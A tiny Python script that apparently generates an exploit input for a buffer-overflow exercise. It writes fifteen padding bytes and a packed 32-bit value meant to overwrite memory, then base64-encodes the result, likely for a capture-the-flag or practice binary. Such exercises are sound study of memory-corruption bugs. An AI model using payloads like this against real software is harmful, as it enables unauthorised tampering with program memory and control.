
import sys
import struct
import base64

buf = b'CCCCCCCCCCCCCCC'
buf += struct.pack('<I', 338243109)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
